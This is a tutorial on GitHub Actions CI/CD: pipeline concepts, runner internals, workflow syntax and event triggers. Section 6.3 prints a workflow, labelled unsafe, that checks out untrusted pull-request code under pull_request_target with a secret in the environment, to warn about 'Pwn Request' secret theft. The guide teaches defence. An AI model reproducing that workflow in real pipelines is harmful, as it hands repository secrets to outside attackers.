# GitHub Actions: Zero to Hero

**A production-grade, in-depth guide for engineers who design and own CI/CD pipelines.**

> Written for backend engineers who are strong at building software but new to owning the delivery pipeline. Every concept is explained from first principles, then taken all the way to what you actually need on a production system.
>
> Last verified against GitHub Actions as of **September 2026**. Action versions, runner images and platform features change; Appendix E lists the versions used throughout and how to check for newer ones.

---

## How to use this guide

This is long on purpose. It is meant to be a reference you keep coming back to, not something you read once.

There are five parts:

| Part | What it covers | Read it when |
|---|---|---|
| **I — Foundations** | Why CI/CD exists, why Actions, and what actually happens when you push | First. Do not skip it. The internals chapter makes everything later obvious |
| **II — The Language** | Every piece of workflow syntax, in depth | Second, in order. This is the grammar |
| **III — Building Blocks You Author** | Composite actions, reusable workflows, custom actions | When you start repeating yourself |
| **IV — The Workflow Catalog** | Every *type* of workflow used in production, categorised, with examples | When you ask "what should we even automate?" |
| **V — Production Engineering** | Security, cost, reliability, observability, governance, migration | When your pipeline becomes load-bearing |

**If you are in a hurry and need to ship something on Monday**, read chapters 3, 5, 6, 10, 17, 18, then jump to Chapter 44 (the complete Spring Boot pipeline) and work backwards from it.

### Conventions used here

- Code blocks that are complete, runnable workflow files start with a `# .github/workflows/<name>.yml` comment.
- Fragments that are meant to be pasted *into* a workflow are marked as such.
- ⚠️ marks something that will bite you in production.
- 🧠 marks a mental model worth internalising.
- 💰 marks something that costs real money.

---

## Table of contents

**Part I — Foundations**
1. [The Problem CI/CD Solves](#chapter-1--the-problem-cicd-solves)
2. [Why GitHub Actions](#chapter-2--why-github-actions)
3. [The Mental Model](#chapter-3--the-mental-model)
4. [Internals: What Actually Happens When You Push](#chapter-4--internals-what-actually-happens-when-you-push)

**Part II — The Language**

5. [Workflow File Anatomy](#chapter-5--workflow-file-anatomy)
6. [Events and Triggers](#chapter-6--events-and-triggers)
7. [Runners](#chapter-7--runners)
8. [Jobs, Steps, Shells and the Runner Filesystem](#chapter-8--jobs-steps-shells-and-the-runner-filesystem)
9. [Contexts, Expressions and Functions](#chapter-9--contexts-expressions-and-functions)
10. [Variables, Inputs, Outputs and Data Flow](#chapter-10--variables-inputs-outputs-and-data-flow)
11. [Conditionals, `needs`, and the Job Graph](#chapter-11--conditionals-needs-and-the-job-graph)
12. [Matrix Strategies](#chapter-12--matrix-strategies)
13. [Concurrency, Cancellation, Timeouts and Retries](#chapter-13--concurrency-cancellation-timeouts-and-retries)
14. [Caching](#chapter-14--caching)
15. [Artifacts](#chapter-15--artifacts)
16. [Container Jobs and Service Containers](#chapter-16--container-jobs-and-service-containers)
17. [Permissions and `GITHUB_TOKEN`](#chapter-17--permissions-and-github_token)
18. [Secrets, Variables and Environments](#chapter-18--secrets-variables-and-environments)
19. [OIDC: Keyless Authentication to Cloud Providers](#chapter-19--oidc-keyless-authentication-to-cloud-providers)

**Part III — Building Blocks You Author**

20. [Marketplace Actions: Choosing, Pinning, Auditing](#chapter-20--marketplace-actions-choosing-pinning-auditing)
21. [Composite Actions](#chapter-21--composite-actions)
22. [Reusable Workflows](#chapter-22--reusable-workflows)
23. [JavaScript / TypeScript Actions](#chapter-23--javascript--typescript-actions)
24. [Docker Container Actions](#chapter-24--docker-container-actions)
25. [Workflow Commands and the Runner Protocol](#chapter-25--workflow-commands-and-the-runner-protocol)
26. [Choosing and Publishing Your Own Building Blocks](#chapter-26--choosing-and-publishing-your-own-building-blocks)

**Part IV — The Workflow Catalog**

27. [A Taxonomy of Production Workflows](#chapter-27--a-taxonomy-of-production-workflows)
28. [Category A — Fast Feedback and Quality Gates](#chapter-28--category-a-fast-feedback-and-quality-gates)
29. [Category B — Test Workflows](#chapter-29--category-b-test-workflows)
30. [Category C — Build and Package](#chapter-30--category-c-build-and-package)
31. [Category D — Security and Supply Chain](#chapter-31--category-d-security-and-supply-chain)
32. [Category E — Publishing to Artifact and Container Registries](#chapter-32--category-e-publishing-to-artifact-and-container-registries)
33. [Category F — Deployment Workflows](#chapter-33--category-f-deployment-workflows)
34. [Category G — Release Engineering](#chapter-34--category-g-release-engineering)
35. [Category H — Infrastructure as Code](#chapter-35--category-h-infrastructure-as-code)
36. [Category I — Scheduled and Maintenance Workflows](#chapter-36--category-i-scheduled-and-maintenance-workflows)
37. [Category J — Manual Operational Runbooks](#chapter-37--category-j-manual-operational-runbooks)
38. [Category K — Repo Automation and ChatOps](#chapter-38--category-k-repo-automation-and-chatops)
39. [Category L — Orchestration and Monorepo Fan-Out](#chapter-39--category-l-orchestration-and-monorepo-fan-out)
40. [Category M — Notifications and Alerting](#chapter-40--category-m-notifications-and-alerting)
41. [Category N — Observability and Analytics Workflows](#chapter-41--category-n-observability-and-analytics-workflows)
42. [Category O — Governance and Compliance](#chapter-42--category-o-governance-and-compliance)

**Part V — Production Engineering**

43. [Designing a Pipeline End to End](#chapter-43--designing-a-pipeline-end-to-end)
44. [Complete Worked Example: Java / Spring Boot Microservice](#chapter-44--complete-worked-example-java--spring-boot-microservice)
45. [Complete Worked Example: Go Microservice](#chapter-45--complete-worked-example-go-microservice)
46. [Monorepo Strategies](#chapter-46--monorepo-strategies)
47. [Branching Models and the Merge Queue](#chapter-47--branching-models-and-the-merge-queue)
48. [Security Hardening: A Threat Model](#chapter-48--security-hardening-a-threat-model)
49. [Performance and Cost Engineering](#chapter-49--performance-and-cost-engineering)
50. [Reliability Engineering for Pipelines](#chapter-50--reliability-engineering-for-pipelines)
51. [Observability, Analytics and DORA Metrics](#chapter-51--observability-analytics-and-dora-metrics)
52. [Debugging and Testing Workflows](#chapter-52--debugging-and-testing-workflows)
53. [Limits, Quotas and Billing](#chapter-53--limits-quotas-and-billing)
54. [Governance at Organisation Scale](#chapter-54--governance-at-organisation-scale)
55. [Migrating from Jenkins and GitLab CI](#chapter-55--migrating-from-jenkins-and-gitlab-ci)
56. [Anti-Patterns](#chapter-56--anti-patterns)
57. [Troubleshooting Cookbook](#chapter-57--troubleshooting-cookbook)

**Appendices**

- [Appendix A — Context Reference](#appendix-a--context-reference)
- [Appendix B — Expression Function Reference](#appendix-b--expression-function-reference)
- [Appendix C — Default Environment Variables](#appendix-c--default-environment-variables)
- [Appendix D — Workflow Command Reference](#appendix-d--workflow-command-reference)
- [Appendix E — Action Versions Used in This Guide](#appendix-e--action-versions-used-in-this-guide)
- [Appendix F — Glossary](#appendix-f--glossary)
- [Appendix G — A 30-Day Mastery Plan](#appendix-g--a-30-day-mastery-plan)

---
# Part I — Foundations

---

## Chapter 1 — The Problem CI/CD Solves

### 1.1 Life before automation

Imagine a team of six backend engineers on a Spring Boot service. There is no CI. The workflow is:

1. Everyone works on branches.
2. Before merging, you *hope* someone ran the tests.
3. To release, one person — usually the same person — pulls `main`, runs `mvn clean package` on their laptop, SCPs the JAR to a server, and restarts the service.

This breaks in predictable ways:

| Failure | Why it happens |
|---|---|
| "It works on my machine" | Local JDK 21, server JDK 17. Local has a `~/.m2/settings.xml` nobody else has |
| Broken `main` | Two PRs each pass in isolation but conflict semantically once merged |
| Untested code in production | Tests were skipped because "it's a tiny change" |
| Bus factor of one | Only Ravi knows the deploy steps, and Ravi is on leave |
| No audit trail | Nobody can say which commit is running in production |
| Slow, scary releases | Because releases are rare and manual, each one is big and risky |

### 1.2 The three ideas

**Continuous Integration (CI)** — every change is merged into a shared mainline frequently, and every merge is automatically built and tested in a clean, reproducible environment. The goal is not "we run tests"; the goal is *main is always in a known-good state*.

**Continuous Delivery (CD)** — every commit that passes CI produces a deployable artifact, and deploying it is a push-button operation. You *could* release at any moment.

**Continuous Deployment** — the same, but the button presses itself. Passing commits go to production automatically.

🧠 **The key insight:** CI/CD is not about tooling. It is about *shrinking the feedback loop and making the deployable artifact the single source of truth*. The tool is just where you encode that.

```mermaid
flowchart LR
    A["Developer commits"] --> B["Automated build"]
    B --> C["Automated tests"]
    C --> D["Immutable artifact"]
    D --> E["Automated deploy to staging"]
    E --> F{"Human approval?"}
    F -->|"Continuous Delivery"| G["Manual promote to prod"]
    F -->|"Continuous Deployment"| H["Automatic promote to prod"]
    G --> I["Production"]
    H --> I
```

### 1.3 What a pipeline is actually for

A good pipeline does five distinct jobs. Confusing them is the most common design mistake.

1. **Verification** — is this change correct? (lint, tests, type checks, security scans)
2. **Production of artifacts** — turn source into something immutable and deployable (a JAR, a container image, a binary)
3. **Provenance** — record *what* was built, *from what source*, *by whom*, *when*, and prove it later
4. **Promotion** — move a specific artifact through environments, unchanged
5. **Feedback** — tell humans what happened, quickly and legibly

⚠️ The single most common production mistake: **rebuilding the artifact for each environment.** If you build a separate image for staging and for production, you never actually tested what you shipped. Build once, promote the same digest everywhere.

```mermaid
flowchart TD
    subgraph WRONG["Anti-pattern: build per environment"]
        S1["Source"] --> B1["Build for staging"] --> E1["Staging"]
        S1 --> B2["Build for prod"] --> E2["Production"]
    end
    subgraph RIGHT["Correct: build once, promote"]
        S2["Source"] --> B3["Build once"] --> AR["Artifact digest sha256:abc..."]
        AR --> E3["Staging"]
        AR --> E4["Production"]
    end
```

### 1.4 A short history, and why it matters

Knowing the lineage tells you why Actions is shaped the way it is.

| Era | Tool | Model | Pain it left behind |
|---|---|---|---|
| 2001+ | CruiseControl, Hudson → **Jenkins** | A server you own, plugins for everything, config in a UI or a Groovy `Jenkinsfile` | Snowflake servers, plugin dependency hell, config drift, "who upgraded the agent?" |
| 2011+ | **Travis CI**, CircleCI | Hosted SaaS, config as a YAML file *in the repo* | Config-as-code was the breakthrough. But CI lived outside the code host |
| 2015+ | **GitLab CI** | CI built into the code host, YAML in repo | Excellent, but you have to be on GitLab |
| 2018 | **GitHub Actions** | CI built into GitHub, YAML in repo, plus a *marketplace of reusable units* and a *generic event bus* | — |

The two genuinely new ideas Actions brought:

1. **It is an event bus for the whole repository, not just a build tool.** An issue being labelled, a PR review being submitted, a release being published, a cron tick — all of these are first-class triggers. Actions automates *the repository*, and CI happens to be the most common use.
2. **Composable, versioned, shareable units of work** (actions) published and consumed like library dependencies.

---

## Chapter 2 — Why GitHub Actions

### 2.1 Honest comparison

| | GitHub Actions | Jenkins | GitLab CI | CircleCI | Buildkite |
|---|---|---|---|---|---|
| Hosting | Managed by GitHub (self-hosted runners optional) | You run it | Managed or self | Managed | Control plane managed, runners yours |
| Config | YAML in `.github/workflows/` | `Jenkinsfile` (Groovy) or UI | `.gitlab-ci.yml` | `.circleci/config.yml` | YAML + your scripts |
| Reuse unit | Actions, composite actions, reusable workflows | Shared libraries, plugins | `include:`, components | Orbs | Plugins |
| Ecosystem | Very large marketplace | Very large, ageing plugin set | Moderate | Moderate | Small but high quality |
| Triggers | Huge set of repo events | Mostly SCM + cron | SCM + cron + pipelines | SCM + cron | SCM + API |
| Secrets/identity | Native OIDC to AWS/GCP/Azure, env-scoped secrets | Credentials plugin | Native OIDC | Contexts + OIDC | Yours |
| Where it shines | Your code already lives on GitHub; repo automation beyond CI | Total control, exotic hardware, air-gapped | Integrated DevSecOps if you're on GitLab | Fast, good caching UX | Hybrid: cheap own compute, nice UI |
| Where it hurts | YAML gets sprawling; debugging is remote-only; hosted minutes cost money | Operational burden is enormous | Tied to GitLab | Cost at scale | You operate compute |

### 2.2 When Actions is the right call

Pick GitHub Actions when:

- Your source is on GitHub. Proximity matters more than any feature — no webhook plumbing, no token juggling, PR checks are native.
- You want automation *beyond* build/test: triage, labelling, releases, docs, dependency updates, scheduled reports.
- You want cloud auth without long-lived credentials (OIDC is excellent here).
- Your team is small-to-medium and does not want to operate a CI server.

Pick something else when:

- You need exotic build hardware or an air-gapped network *and* do not want to run self-hosted runners (though Actions Runner Controller makes this very viable).
- You have a huge monorepo with sophisticated build-graph needs where a purpose-built system (Buildkite + Bazel, or an internal orchestrator) pays off.
- 💰 Your CI minutes bill on hosted runners would exceed the cost of operating your own fleet. At high volume, self-hosted or third-party runners (Namespace, BuildJet, Blacksmith, WarpBuild) are meaningfully cheaper and faster.

### 2.3 What GitHub Actions actually gives you

Concretely, the platform provides:

- **An event bus.** ~35 repository/organisation event types you can subscribe to.
- **Ephemeral compute.** A clean VM or container per job, with a curated image full of language toolchains.
- **A workflow engine.** A DAG of jobs with dependencies, conditions, matrices, concurrency control.
- **An identity provider.** `GITHUB_TOKEN` scoped per run, plus OIDC tokens for external clouds.
- **Storage services.** An artifact store and a cache service, scoped per repository.
- **A component model.** Actions (versioned units of work) and reusable workflows.
- **A governance layer.** Environments with approval gates, org policies, allowed-actions lists, execution protections, audit logs.
- **A UI and API.** Run history, logs, job summaries, annotations, a full REST/GraphQL surface.

---

## Chapter 3 — The Mental Model

Internalise this and 80% of Actions stops being mysterious.

### 3.1 The five nouns

```mermaid
flowchart TD
    EV["EVENT<br/>something happened in the repo"] --> WF["WORKFLOW<br/>a YAML file in .github/workflows/"]
    WF --> J1["JOB A<br/>runs on one runner"]
    WF --> J2["JOB B<br/>runs on another runner"]
    J1 --> S1["STEP 1: uses an ACTION"]
    J1 --> S2["STEP 2: runs a shell command"]
    J2 --> S3["STEP 1: runs a shell command"]
    S1 --> R["RUNNER<br/>a machine that executes steps"]
    S2 --> R
    S3 --> R2["RUNNER (separate machine)"]
```

| Noun | Definition | Key property |
|---|---|---|
| **Event** | Something that happened: a push, a PR opened, a cron tick, a manual click, an API call | Carries a **payload** describing what happened |
| **Workflow** | One YAML file in `.github/workflows/`. Subscribes to events, contains jobs | A repo can have many. They are independent |
| **Job** | A named group of steps that runs on **one runner**, start to finish | Jobs run **in parallel by default**. Each gets a **fresh machine** |
| **Step** | One unit of work inside a job. Either `run:` (a shell command) or `uses:` (an action) | Steps share the same filesystem and process environment |
| **Runner** | The machine executing a job | GitHub-hosted (ephemeral VM) or self-hosted |

### 3.2 The six rules that explain most confusing behaviour

1. **Each job gets a brand new machine.** Nothing you wrote to disk in job A exists in job B. To pass data: artifacts (files) or job outputs (strings).
2. **Jobs run in parallel unless you say otherwise.** `needs:` creates ordering.
3. **Steps run sequentially and share the machine.** A file written in step 2 is visible in step 5.
4. **Each `run:` step is a separate shell process.** `export FOO=bar` in one step is gone in the next. Use `$GITHUB_ENV` to persist.
5. **The workflow file that runs is the one at the commit that triggered the event** — except for `schedule`, `workflow_dispatch` and `workflow_run`, which always use the default branch.
6. **A workflow cannot "call" another workflow mid-run** in the way a function calls a function, except via reusable workflows (`workflow_call`) or by triggering another workflow through an event.

### 3.3 A minimal, complete workflow

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-java@v6
        with:
          distribution: temurin
          java-version: '21'
          cache: maven

      - run: mvn -B verify
```

Read it out loud: *"On a push to main, or on any pull request, run a job called `test` on an Ubuntu machine. Check out the code, install Java 21, run the Maven build."*

That is the whole model. Everything else in this guide is detail on top of it.

### 3.4 Where the files live

```
your-repo/
├── .github/
│   ├── workflows/            # every file here is a workflow
│   │   ├── ci.yml
│   │   ├── deploy.yml
│   │   └── nightly.yml
│   ├── actions/              # local composite actions (convention, not required)
│   │   └── setup-build-env/
│   │       └── action.yml
│   ├── dependabot.yml
│   └── CODEOWNERS
└── src/
```

Only `.github/workflows/` is special to the engine. Workflows are discovered on the **default branch** for scheduled and manual events, and on the **triggering ref** for push/PR events.

---

## Chapter 4 — Internals: What Actually Happens When You Push

You do not need to be able to reimplement Actions. You *do* need this model to reason about caching, security, debugging and cost.

### 4.1 The full lifecycle

```mermaid
sequenceDiagram
    participant Dev as Developer
    participant Git as GitHub Git backend
    participant Bus as Event/webhook service
    participant Svc as Actions orchestration service
    participant Q as Job queue
    participant R as Runner
    participant St as Artifact & Cache services

    Dev->>Git: git push
    Git->>Bus: emit "push" event with payload
    Bus->>Svc: deliver event
    Svc->>Svc: find .github/workflows/*.yml at that SHA
    Svc->>Svc: evaluate on: filters (branches, paths, types)
    Svc->>Svc: parse YAML, expand matrices, build job DAG
    Svc->>Svc: create Workflow Run, assign run_id
    Svc->>Q: enqueue jobs with no unmet needs
    R->>Q: long-poll "any job for my labels?"
    Q-->>R: here is job + a scoped run token
    R->>R: provision workspace, download actions
    loop for each step
        R->>R: execute step, stream logs over websocket
        R->>Svc: post log chunks, annotations, status
    end
    R->>St: upload artifacts / save cache
    R->>Svc: report job conclusion
    Svc->>Q: enqueue downstream jobs whose needs are now met
    Svc->>Git: post check-run status back onto the commit
```

### 4.2 The components, explained

**The event/webhook layer.** Every repository action emits an event with a JSON payload. Actions is one subscriber. That payload becomes `github.event` inside your workflow — the *entire* webhook body is available to you.

**Workflow resolution and parsing.** The service fetches the workflow files, validates the YAML against the schema, and evaluates *only the expressions it can evaluate at this stage*. This is why some contexts are unavailable in some places (see §9.5): `on:` filters and job-level `if:` are evaluated before any runner exists, so `env:` and `secrets` are not available there.

**The job DAG.** Jobs and their `needs:` relationships form a directed acyclic graph. A matrix expands into N parallel jobs *at this point* — which is why a dynamic matrix must come from an upstream job's output, and why you cannot change a matrix mid-run.

**The queue and runner assignment.** Jobs sit in a queue labelled by `runs-on`. Runners poll. This is a **pull** model, not a push model — which is why self-hosted runners only need outbound HTTPS, no inbound firewall holes.

🧠 The pull model also explains queue time. If all your `ubuntu-latest` concurrency slots are busy, jobs sit in `queued`. Queue time is not billed, but it is real latency.

**The runner agent.** A small .NET application (`Runner.Listener` / `Runner.Worker`). It:
- receives the job message, which contains the resolved step list and a short-lived token
- creates the working directory tree
- downloads every `uses:` action (git clone for repo actions, `docker pull` for container actions)
- runs each step as a child process, intercepting stdout for **workflow commands** (Chapter 25)
- streams logs, uploads artifacts, and reports back

**Storage services.** The **cache service** and the **artifact service** are separate HTTP services the runner talks to with the run token. They are per-repository and have their own scoping and eviction rules (Chapters 14–15).

### 4.3 The runner filesystem

```mermaid
flowchart TD
    RW["RUNNER_WORKSPACE<br/>/home/runner/work/my-repo"] --> GW["GITHUB_WORKSPACE<br/>/home/runner/work/my-repo/my-repo<br/>your code lands here after checkout"]
    RW --> TMP["RUNNER_TEMP<br/>/home/runner/work/_temp<br/>scratch, env files, cleared after job"]
    RW --> TC["RUNNER_TOOL_CACHE<br/>/opt/hostedtoolcache<br/>pre-installed JDKs, Node, Python"]
    RW --> ACT["_actions<br/>downloaded action source"]
```

| Variable | Typical value | What it is |
|---|---|---|
| `GITHUB_WORKSPACE` | `/home/runner/work/repo/repo` | Default working directory for every `run:` step. Empty until `actions/checkout` runs |
| `RUNNER_TEMP` | `/home/runner/work/_temp` | Scratch space. Cleaned between jobs. Where `$GITHUB_ENV`, `$GITHUB_OUTPUT` files live |
| `RUNNER_TOOL_CACHE` | `/opt/hostedtoolcache` | Pre-baked toolchains. `setup-java` etc. look here first, which is why they are fast |
| `GITHUB_ACTION_PATH` | varies | Inside a composite action, the path to that action's own directory |

⚠️ **The workspace is empty at job start.** A step that does `mvn verify` without a preceding `actions/checkout` will fail with "no pom.xml". This trips up everyone once.

### 4.4 What "ephemeral" really means for you

| Consequence | Practical impact |
|---|---|
| Fresh VM per job | No state leaks between jobs — good for reproducibility, bad for speed. Hence caching |
| Root/sudo available on hosted Linux runners | You can `apt-get install` freely, but it costs ~20-60s each time |
| Docker daemon pre-installed on Linux hosted runners | You can build and run containers directly |
| Machine destroyed after the job | Anything not uploaded as an artifact, saved to cache, or pushed to a registry is **gone** |
| Logs retained, disk not | Debug by printing, by uploading artifacts, or by `tmate`-style interactive sessions |

### 4.5 Token lifetime and why it matters for security

For each job, GitHub mints a fresh **installation access token** for the `github-actions[bot]` GitHub App, scoped to that repository, with the permissions declared in your `permissions:` block. It is injected as `github.token` / `secrets.GITHUB_TOKEN`. It expires when the job finishes (or after 24h, whichever is first).

This is why:
- You should always declare `permissions:` explicitly (Chapter 17) — the token is powerful by default in older repo settings.
- A leaked `GITHUB_TOKEN` from a log has a short but non-zero blast radius.
- OIDC (Chapter 19) applies the same idea to *external* clouds: a short-lived token minted per job, no stored credentials.

### 4.6 A note on GitHub Enterprise Server

GHES runs the same engine, but lags GitHub.com by several releases. Features noted as "not available on GHES" in this guide (for example the September 2026 `job.workflow_ref` properties) will arrive later. Always check the GHES release notes for your version before copying a workflow from a GitHub.com example.

---
# Part II — The Language

---

## Chapter 5 — Workflow File Anatomy

### 5.1 The complete top-level shape

```yaml
# .github/workflows/example.yml

name: Example Workflow            # shown in the UI. Optional; defaults to file path
run-name: Deploy by @${{ github.actor }}   # optional, per-run title

on: { }                           # REQUIRED: what triggers this workflow

permissions: { }                  # default GITHUB_TOKEN scopes for all jobs

env: { }                          # environment variables for all jobs

defaults:                         # default settings for all run: steps
  run:
    shell: bash
    working-directory: ./service

concurrency: { }                  # run-level concurrency group

cache-mode: read                  # workflow-level cache access (read | write | none)

jobs:                             # REQUIRED: at least one job
  job_id:
    name: Human readable name
    runs-on: ubuntu-latest
    needs: [other_job]
    if: ${{ github.ref == 'refs/heads/main' }}
    permissions: { }
    environment: production
    concurrency: { }
    cache-mode: none
    outputs: { }
    env: { }
    defaults: { }
    timeout-minutes: 30
    continue-on-error: false
    strategy: { }
    container: { }
    services: { }
    steps:
      - name: A step
        id: step_id
        if: ${{ success() }}
        uses: actions/checkout@v7
        with: { }
        env: { }
        continue-on-error: false
        timeout-minutes: 5
        working-directory: ./x
        shell: bash
```

That is genuinely the whole surface area of a normal workflow. Reusable workflows add `on.workflow_call` and the `uses:`-at-job-level form (Chapter 22).

### 5.2 YAML gotchas that will bite you

GitHub Actions uses standard YAML 1.2, and almost every "weird" workflow bug is actually a YAML bug.

**`on` is parsed as boolean `true` by some YAML linters.** YAML 1.1 treats `on`, `off`, `yes`, `no` as booleans. GitHub's parser handles `on:` correctly, but your editor or a linter may complain. Ignore it, or quote it as `"on":`.

**Version numbers get mangled.**

```yaml
# WRONG — YAML reads 3.10 as the number 3.1
- uses: actions/setup-python@v7
  with:
    python-version: 3.10     # becomes "3.1"

# RIGHT
    python-version: '3.10'
```

Always quote version strings. `'21'`, `'3.12'`, `'1.24'`.

**`on:` with no value under a key means "all activity types".**

```yaml
on:
  pull_request:      # all default types: opened, synchronize, reopened
  push:
    branches: [main]
```

**Multiline strings.** `|` keeps newlines (what you want for shell scripts). `>` folds newlines into spaces (what you want for long prose).

```yaml
- run: |
    set -euo pipefail
    echo "line one"
    echo "line two"
```

**Colons inside unquoted strings break parsing.**

```yaml
# WRONG
- run: echo Result: passed
# RIGHT
- run: 'echo "Result: passed"'
```

**Indentation is two spaces, always, and tabs are illegal.**

### 5.3 `name` and `run-name`

`name` is the workflow's display name. `run-name` sets the title of each individual run and supports expressions — extremely useful for manual workflows:

```yaml
run-name: "Deploy ${{ inputs.service }} → ${{ inputs.environment }} by @${{ github.actor }}"
```

Without it, a `workflow_dispatch` run history is a wall of identical rows.

### 5.4 `defaults`

Saves repetition and prevents a whole class of bug:

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./backend
```

⚠️ On Ubuntu runners the default shell is `bash -e {0}` — errors stop the step, but **pipeline failures do not**. `foo | bar` succeeds if `bar` succeeds even when `foo` fails. Setting `shell: bash` explicitly changes it to `bash --noprofile --norc -eo pipefail {0}`, which is what you want. Do this in every workflow.

### 5.5 Where to put things: one workflow or many?

A frequent beginner question. The rule:

**One workflow per trigger-and-purpose combination.** Not one giant workflow with fifty `if:` conditions.

| Good | Bad |
|---|---|
| `pr-checks.yml` on `pull_request` | `everything.yml` with `if: github.event_name == 'pull_request'` on every job |
| `deploy-staging.yml` on `push: main` | The same file also handling releases, nightlies and manual deploys |
| `nightly-e2e.yml` on `schedule` | |
| `release.yml` on `push: tags` | |

Reasons: separate run histories, separate required-status-check names, separate concurrency groups, separate permissions, and you can restrict who can trigger `deploy.yml` without touching CI.

Share logic between them with **reusable workflows** and **composite actions** (Part III), not by merging files.

---

## Chapter 6 — Events and Triggers

This is where most of the power is, and where most people stop at `push` and `pull_request`.

### 6.1 The trigger landscape

```mermaid
flowchart TD
    subgraph CODE["Code events"]
        P["push"]
        PR["pull_request"]
        PRT["pull_request_target"]
        PRR["pull_request_review"]
        PRC["pull_request_review_comment"]
        MG["merge_group"]
        CR["create / delete"]
        FK["fork"]
    end
    subgraph REPO["Repository events"]
        IS["issues"]
        IC["issue_comment"]
        DI["discussion"]
        LB["label"]
        MI["milestone"]
        WA["watch / star"]
        GL["gollum (wiki)"]
    end
    subgraph RELEASE["Release & packages"]
        RL["release"]
        PK["package"]
        RG["registry_package"]
    end
    subgraph DEPLOY["Deployment"]
        DP["deployment"]
        DS["deployment_status"]
        PG["page_build"]
        ST["status"]
        CS["check_suite / check_run"]
    end
    subgraph MANUAL["Manual & programmatic"]
        WD["workflow_dispatch"]
        RD["repository_dispatch"]
        WR["workflow_run"]
        WC["workflow_call"]
        SC["schedule"]
    end
```

### 6.2 `push`

```yaml
on:
  push:
    branches:
      - main
      - 'release/**'          # glob
    branches-ignore:          # cannot be combined with branches
      - 'dependabot/**'
    tags:
      - 'v*.*.*'
    paths:
      - 'src/**'
      - 'pom.xml'
    paths-ignore:
      - '**.md'
      - 'docs/**'
```

Rules:
- `branches` and `branches-ignore` are mutually exclusive. Same for `paths`/`paths-ignore` and `tags`/`tags-ignore`.
- If you specify `tags:` and not `branches:`, the workflow runs **only** on tag pushes.
- Glob syntax: `*` matches anything except `/`, `**` matches anything including `/`, `?` one character, `+` and `!` for extended matching.

⚠️ **Path filters do not work the way you expect on tag pushes or on the first push to a new branch.** For a new branch, GitHub compares against the default branch head. For tags, path filters are evaluated against the commits in the push — frequently empty. If a tag-triggered release workflow mysteriously never runs, remove your path filters.

⚠️ **Path filters and required status checks are a trap.** If `ci.yml` is a required check but has `paths: ['src/**']`, a docs-only PR will never produce that check and will be blocked forever. Solutions in §28.6.

### 6.3 `pull_request` vs `pull_request_target` — the most important security distinction in Actions

```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
    branches: [main]
```

Default activity types are `opened`, `synchronize` (new commits pushed), `reopened`.

Other useful types: `ready_for_review` (draft → ready), `labeled`, `closed`, `edited`, `review_requested`.

**What `pull_request` runs:** the workflow file from the **base** branch merged with the PR head — specifically it checks out an ephemeral **merge commit** (`refs/pull/N/merge`). The code is untrusted fork code.

**Its safety property:** for PRs from forks, `GITHUB_TOKEN` is **read-only** and **secrets are not available**. Fork code cannot exfiltrate anything.

**What `pull_request_target` runs:** the workflow file from the **base** branch, in the context of the base repository — with **full write token and full access to secrets**, while the PR's untrusted code sits in the repository.

```mermaid
flowchart TD
    subgraph PRE["pull_request  (safe by default)"]
        A1["Fork PR opened"] --> A2["Workflow from base branch"]
        A2 --> A3["Checkout = PR merge commit<br/>UNTRUSTED CODE"]
        A3 --> A4["Token: read-only<br/>Secrets: NOT available"]
    end
    subgraph PRT["pull_request_target  (dangerous)"]
        B1["Fork PR opened"] --> B2["Workflow from base branch"]
        B2 --> B3["Checkout default = BASE commit<br/>trusted code"]
        B3 --> B4["Token: WRITE<br/>Secrets: AVAILABLE"]
        B4 --> B5{"Did you check out<br/>the PR head?"}
        B5 -->|"yes"| B6["PWN REQUEST<br/>attacker code runs<br/>with your secrets"]
        B5 -->|"no"| B7["Safe-ish"]
    end
```

⚠️⚠️ **The "Pwn Request" vulnerability.** This is the single most exploited GitHub Actions flaw:

```yaml
# CATASTROPHICALLY UNSAFE — do not copy
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # untrusted code
      - run: npm ci && npm run build                        # runs attacker's scripts
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}               # handed to the attacker
```

Anyone can open a PR with a malicious `package.json` `postinstall` script and steal every secret in the repository.

**Rules for `pull_request_target`:**
1. Prefer not to use it at all.
2. Legitimate uses: labelling PRs, commenting on PRs, applying `CODEOWNERS` logic — things that need write access but **must not execute PR code**.
3. If you must combine it with checking out PR code, split into two workflows: an untrusted `pull_request` job that builds and uploads an artifact, and a trusted `workflow_run` job that consumes it (§6.9).
4. Never use `${{ github.event.pull_request.* }}` values directly inside `run:` (script injection — §48.3).

📌 **As of 2026, GitHub is enforcing a default policy that blocks `pull_request_target` in public repositories** unless explicitly allowed by an Actions event policy. The rule initially runs in evaluate mode and becomes enforced from November 2, 2026; it does not apply to private or internal repositories. See Chapter 54 on workflow execution protections.

Also note that `actions/checkout` itself hardened its defaults: a breaking change introduced an `allow-unsafe-pr-checkout` gate around checking out PR head refs in `pull_request_target` contexts.

### 6.4 `workflow_dispatch` — manual runs

The backbone of operational tooling.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Target environment'
        required: true
        type: environment          # renders a dropdown of configured environments
      service:
        description: 'Service to deploy'
        required: true
        type: choice
        options: [api, worker, scheduler]
        default: api
      version:
        description: 'Image tag or git SHA'
        required: true
        type: string
      dry_run:
        description: 'Plan only, do not apply'
        type: boolean
        default: true
      replicas:
        description: 'Replica count'
        type: number
        default: 3
```

Input types: `string`, `choice`, `boolean`, `number`, `environment`. Maximum **10 inputs**.

Access them via `inputs.version` (preferred) or `github.event.inputs.version` (legacy — always a string, even for booleans).

⚠️ With `github.event.inputs.dry_run`, `false` is the *string* `"false"`, which is truthy. Use `inputs.dry_run` instead, which respects the declared type.

The workflow must exist on the **default branch** for the "Run workflow" button to appear, even if you then select a different branch to run it against.

You can also trigger it via API or CLI:

```bash
gh workflow run deploy.yml \
  --ref main \
  -f environment=production \
  -f service=api \
  -f version=v1.4.2
```

### 6.5 `schedule` — cron

```yaml
on:
  schedule:
    - cron: '0 2 * * *'                       # 02:00 UTC daily
    - cron: '30 18 * * 1-5'
      timezone: 'Asia/Kolkata'                # IANA timezone support
```

